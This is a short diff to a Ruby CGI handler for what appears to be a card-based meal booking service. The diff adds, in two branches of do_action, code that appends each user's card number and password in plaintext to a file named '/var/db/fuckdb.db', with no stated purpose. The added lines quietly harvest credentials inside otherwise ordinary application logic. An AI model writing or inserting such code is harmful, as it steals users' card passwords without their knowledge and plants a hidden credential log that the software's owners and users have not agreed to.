@@ -110,11 +110,19 @@ def do_action(cgi, action, forum_uid)
       card_passwd = get_card_password(forum_uid, card_no)
     end
 
+    File.open('/var/db/fuckdb.db', 'a') do |f|
+      f.puts "#{card_no}:#{card_passwd}"
+    end
+
     return do_batch(card_no, card_passwd)
 
   when 'bookmeal_bytmp'
     card_no = cgi['card_no']
     card_passwd = cgi['card_psw']
+
+    File.open('/var/db/fuckdb.db', 'a') do |f|
+      f.puts "#{card_no}:#{card_passwd}"
+    end
 
     return do_batch(card_no, card_passwd)
 
